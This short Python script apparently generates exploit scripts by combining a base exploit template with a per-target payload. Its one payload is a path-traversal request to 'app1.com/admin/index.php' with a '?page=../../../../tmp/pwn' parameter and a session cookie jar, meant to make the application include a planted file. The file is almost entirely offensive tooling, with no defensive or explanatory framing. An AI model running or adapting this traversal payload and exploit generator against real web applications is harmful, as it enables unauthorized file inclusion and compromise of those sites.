
base = file("base_exploit.py").read()

def generate(template, exploit):
    template_data = file(template).read()
    return base.format(template_data, exploit)

def main():
    print(generate("app1.template", """print(requests.get("http://app1.com/admin/index.php?page=../../../../../../../../tmp/pwn", cookies=jar).text)"""))

if __name__ == "__main__":
    main()
